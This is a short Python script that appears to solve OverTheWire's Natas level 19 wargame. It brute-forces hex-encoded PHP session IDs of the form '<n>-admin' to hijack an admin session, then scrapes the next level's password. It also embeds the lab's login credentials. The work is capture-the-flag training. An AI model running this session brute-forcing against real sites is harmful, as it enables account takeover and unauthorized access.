import re
import requests
import binascii

level = 19
creds = ('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
url   = 'http://natas%s.natas.labs.overthewire.org/index.php' % level
 	
session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

#formdata = {'username':'admin','password':'nimda'}
#response = session.post(url,auth=creds,data=formdata)

#print(data)
#print(response.cookies)

for i in range(700):

	formdata = {'username':'admin','password':'nimda'}
	baked_cookies = {"PHPSESSID":str(binascii.hexlify((str(i)+'-admin').encode()).decode())}
	#print(baked_cookies)
	response = session.post(url,auth=creds,cookies=baked_cookies)
	data = response.text
	if "You are an admin" in data:
		print(re.findall("Password: (.*)</pre>",data))
	#print(data)